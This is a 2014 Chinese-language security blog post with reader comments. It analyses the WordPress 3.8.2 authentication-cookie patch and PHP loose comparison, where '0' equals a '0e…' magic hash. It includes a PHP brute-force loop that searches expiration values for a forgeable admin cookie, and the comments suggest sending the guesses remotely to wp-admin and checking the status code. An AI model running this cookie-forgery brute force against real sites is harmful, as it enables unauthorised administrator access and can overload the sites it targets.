@@ -1,0 +1,81 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WordPress 3.8.2 cookie伪造漏洞再分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">donwa</a> <span class="bull">·</span> <time title="2014/04/13 23:12" ui-time="" datetime="2014/04/13 23:12" class="published ng-binding ng-isolate-scope">2014/04/13 23:12</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>看了WordPress 3.8.2补丁分析 HMAC timing attack，眼界大开，原来还可以利用时间差来判断HMAC。</p><p>但我总觉得这个漏洞并不是简单的修复这个问题。</p><p>查看了官方提供的资料:“该漏洞是由WordPress的安全团队成员Jon Cave发现。”。</p><p>也许漏洞还有这样利用的可能。</p><h2>0x01 PHP的特性</h2><hr><p>当PHP在进行 ”==”,”!=”等非严格匹配的情况下，会按照值的实际情况，进行强制转换。</p><pre><code>#!php
+&lt;?php
+var_dump(0 == '0'); // true
+var_dump(0 == 'abcdefg'); // true  
+var_dump(0 === 'abcdefg'); // false
+var_dump(1 == '1abcdef'); // true  
+?&gt;
+</code></pre><p>当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。</p><h2>0x02 分析修复的代码</h2><hr><p>官方版的diff只在php里改动了一个位置:</p><pre><code>#!diff
+&lt;?php
+-  if ( $hmac != $hash ) {  
++  if ( hash_hmac( 'md5', $hmac, $key ) !== hash_hmac( 'md5', $hash, $key ) ) { 
+?&gt;
+</code></pre><p>其中$hmac来源于cookies。是我们可控的一个输入参数。</p><pre><code>#!php
+&lt;?php
+Admin|1397564163|1f253e501c301bf5bf293c40d7d92ded
+//$username = ‘Admin’;
+//$expiration = 1397564163;
+//$hmac = ‘1f253e501c301bf5bf293c40d7d92ded’;
+?&gt;
+</code></pre><p>$hash是以下代码生成一个md5值。</p><pre><code>#!php
+&lt;?php
+$key = wp_hash($username . $pass_frag . '|' . $expiration, $scheme);
+$hash = hash_hmac('md5', $username . '|' . $expiration, $key);
+?&gt;
+</code></pre><p>当<code>$hmac == $hash</code> 时，登录成功。</p><p>那么，有几种情况会登录成功。</p><pre><code>#!php
+&lt;?php
+//第一种情况，完全相等。
+$hmac = ‘1f253e501c301bf5bf293c40d7d92ded’;
+$hash = ‘1f253e501c301bf5bf293c40d7d92ded’;
+//第二种情况.第一位为数字，第二位为字母
+$hmac = 1;
+$hash = ‘1f253e501c301bf5bf293c40d7d92ded’;
+//第三种情况。第一位为字母
+$hmac = 0;
+$hash = ‘af253e501c301bf5bf293c40d7d92ded’;
+?&gt;
+</code></pre><p>很明显，第三种出现的情况非常大。</p><p>那么我们有没有可能把$hmac构造成一个整数0呢？</p><h2>0x03 漏洞利用</h2><hr><p>我们看看cookie解析的代码：</p><pre><code>#!php
+&lt;?php
+    $cookie_elements = explode('|', $cookie);
+    if ( count($cookie_elements) != 3 )
+        return false;
+    list($username, $expiration, $hmac) = $cookie_elements;
+?&gt;
+</code></pre><p>当我们把cookie设置为：</p><pre><code>Admin|1397564163|1
+</code></pre><p>时。$hmac=’1’。但是，$hmac是字符串1，而不是整数1。</p><pre><code>#!php
+&lt;?php
+var_dump($hmac);//string(“1”);
+?&gt;
+</code></pre><p>非常遗憾，这个漏洞是不能利用的。</p><p>难道官方修复的真的不是这个漏洞？</p><h2>0x04 柳暗花明又一村</h2><hr><p>还有什么情况能让字符串识别成整数吗？是的，还有！</p><pre><code>#!php
+&lt;?php
+var_dump("0" == "0e1234567890123456...32"); // true
+?&gt;
+</code></pre><p>‘e’会识别为次方，0的N次方为0；</p><p>所以，这个漏洞的利用方式还可以是： 让$hmac = ‘0’;</p><p>通过改变$expiration来改变$hash。获得一个，第一位为0，第二位为e,后面所有位为数字的$hash.</p><pre><code>#!php
+&lt;?php
+$hmac = ‘0’;
+$hash = ‘0e1234567890123456...32’;
+var_dump($hmac == $hash);  // true
+?&gt;
+</code></pre><h2>0x05 攻击代码</h2><hr><p>本地测试代码（实际攻击代码应该是构造cookies远程请求）：</p><pre><code>#!php
+&lt;?php
+    include( 'wp-load.php' );
+
+    $user = get_userdata(1);
+    $username = $user-&gt;user_login;
+    $pass_frag = substr($user-&gt;user_pass, 8, 4);
+
+    $expiration = 9999999999; //设置一个很大的过期时间，然后递减
+
+    while($expiration &gt;0){
+        $key = wp_hash($username . $pass_frag . '|' . $expiration, 'auth');
+        $hash = hash_hmac('md5', $username . '|' . $expiration, $key);
+        if('0' == $hash OR '1'== $hash ){
+            echo $expiration.'@'.$hash;
+            file_put_contents('done.txt',$expiration.'@'.$hash);
+            exit();
+        }
+        $expiration -= 1;//过期时间-1
+        echo $expiration.'@'.$hash."\r\n";
+    }
+?&gt;
+</code></pre><p>通过改变过期时间，尝试碰撞到可以利用的hash。</p><p>按照理论值。碰撞到可以利用的$expiration几率是(2<em>1</em>10^30)/(16^32)。也就是5.8774717541114 * 10 -9。</p><p>理论上：把cookies设置成 “admin|碰撞到的过期时间|0”,就可以登陆后台了。</p><p>但是几率太小，还不如穷举密码了。</p><p>Ps：我本地跑了几个小时了，还没遇到一个。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/news/1401" rel="bookmark" id="re1">WordPress更新至 3.8.2 修复多个漏洞</a></li><li><a href="http://drops.wooyun.org/papers/1404" rel="bookmark" id="re2">WordPress 3.8.2补丁分析 HMAC timing attack</a></li><li><a href="http://drops.wooyun.org/tips/7679" rel="bookmark" id="re3">php比较操作符的安全问题</a></li><li><a href="http://drops.wooyun.org/papers/5233" rel="bookmark" id="re4">当Bcrypt与其他Hash函数同时使用时造成的安全问题</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">donwa</span> <span class="reply-time">2014-04-15 19:36:09</span></div><p></p><p>没看到代码上面的备注吗？<br>本地测试代码（实际攻击代码应该是构造cookies远程请求）</p><p>代码只是想跑出一个hash来证明可以伪造cookie登录。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">不装逼会死黑阔</span> <span class="reply-time">2014-04-15 16:55:30</span></div><p></p><p>这个的实战意义何在？？<br>$pass_frag = substr($user-&gt;user_pass, 8, 4);</p><p>$key = wp_hash($username . $pass_frag . '|' . $expiration, 'auth');<br>$hash = hash_hmac('md5', $username . '|' . $expiration, $key);</p><p>hash除了和登录的用户，$expiration有关还和$key有关，而$key产生又和当前登录的密码有关，$pass_frag = substr($user-&gt;user_pass, 8, 4)<br>这样子，要算出满足条件的hash和$expiration，攻击者要要先登录并且知道$pass_frag？？？这样子的漏洞感觉不到任何实战价值</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-04-14 21:36:17</span></div><p></p><p>赞～～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">donwa</span> <span class="reply-time">2014-04-14 21:27:27</span></div><p></p><p>不管是3亿次还是2亿次还是1亿次。穷举密码是肯定出来了，这个就得靠运气了。<br>是个正常的blog肯定被D死。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ettack</span> <span class="reply-time">2014-04-14 21:21:08</span></div><p></p><p>@insight-labs 大牛正解，我寫的正好就是head請求到wp_admin/profile.php 然後判斷status code，儘量減少數據用量</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-04-14 20:51:19</span></div><p></p><p>提交到/wp-admin/index.php</p><p>然后判断HTTP状态码是不是302跳转，这样发送接收的数据最少</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">syjzwjj</span> <span class="reply-time">2014-04-14 20:29:48</span></div><p></p><p>这么牛！还分布式！！代码发给我一份吧！邮箱:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cfbcb6a5b5b8a5a58fbcb6a5b5b8a5a5e1aca0a2">[email&#160;protected]</a>，谢谢啦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ettack</span> <span class="reply-time">2014-04-14 20:26:15</span></div><p></p><p>作者的代码就可以測試，把調用wp_hash改為寫死key然後取hash可以優化一些，然後再分布式到三台電腦上一台一億很快就出來了。我是用python寫的，需要的話我回去發出來。我連多線程分布式遠程的程序都寫了，不過在測試我自己博客的過程中，很快就把自己博客D掛了，意義不大，哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ettack</span> <span class="reply-time">2014-04-14 20:13:16</span></div><p></p><p>纯字母密码，哈哈，打错成纯数字了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">syjzwjj</span> <span class="reply-time">2014-04-14 20:12:25</span></div><p></p><p>可以分享一下你的测试代码吗，谢啦！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ettack</span> <span class="reply-time">2014-04-14 20:04:55</span></div><p></p><p>另外作者说本地几个小时没跑出来，肯定是姿势不对，我之前测试了五六次基本都是在半小时内可以跑出来</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ettack</span> <span class="reply-time">2014-04-14 20:00:05</span></div><p></p><p>我来比较下这个与爆破密码的请求次数：<br>爆破cookie概率 P=3.26526*10^-9 （算法见http://www.freebuf.com/vuls/31770.html）<br>爆破8位纯字母密码：P=1/26^8<br>因此平均3亿请求碰撞cookie，而需两千亿请求爆破仅仅八位的纯数字密码。<br>不知道我有没有算错。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">syjzwjj</span> <span class="reply-time">2014-04-14 18:18:20</span></div><p></p><p>这个是指登陆后台还是只要访问了wordpress就会有这个cookie啊？如果我不登陆后台的话可以知道这个hmac吗？是不是这个hmac为任意字符串都行的啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">donwa</span> <span class="reply-time">2014-04-14 15:31:07</span></div><p></p><p>登录wordpress后，会得到一个这样的cookie。最后那个类似md5的字符串就是hmac。可以自己伪造。<br>wordpress_logged_in_7065d11a793a3ec8482214fcc4f0a55b=admin|1397480887|1f253e501c301bf5bf293c40d7d92ded</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">syjzwjj</span> <span class="reply-time">2014-04-14 13:51:04</span></div><p></p><p>想请教一下那个$hmac具体是怎么得到的呢?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-04-14 09:52:43</span></div><p></p><p>那这样的话远程5亿次……估计爆破密码可能更快点……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">donwa</span> <span class="reply-time">2014-04-14 08:49:52</span></div><p></p><p>嗯，确实是看http://joncave.co.uk/，觉得这个漏洞应该是隐式转换的问题。没想到是timing attack。<br>概率确实低，理论上，上亿次才能碰撞到一个。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">donwa</span> <span class="reply-time">2014-04-14 08:45:09</span></div><p></p><p>可能我没没说清楚。必须远程尝试，因为$hash是根据用户的密码和AUTH_SALT 生成的。每个wordpress都是不同的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blue</span> <span class="reply-time">2014-04-14 08:26:39</span></div><p></p><p>受教了，php真是门神奇的语言呐～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-04-14 07:51:41</span></div><p></p><p>这个也比较靠谱，可以现在本地计算对应的cookie然后再使用，避免了一次次的远程尝试。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-04-13 23:30:00</span></div><p></p><p>作者应该是追寻这漏洞原作者博客找到的利用思路吧<a href="http://joncave.co.uk/" rel="nofollow">http://joncave.co.uk/</a>，想法其实很不错的，之前也想到了，不过考虑到要求太高前两位必须是0e后面的必须都为数字。所以就没加上，原作者也贴出了此修复主要是为了防御timing attack的攻击方式。<a href="https://github.com/WordPress/WordPress/commit/78a915e0e5927cf413aa6c2cef2fca3dc587f8be" rel="nofollow">https://github.com/WordPress/WordPress/commit/78a915e0e5927cf413aa6c2cef2fca3dc587f8be</a> 小伙伴研究精神值得鼓励 :)</p><p></p></div></div></div></div></div></main>
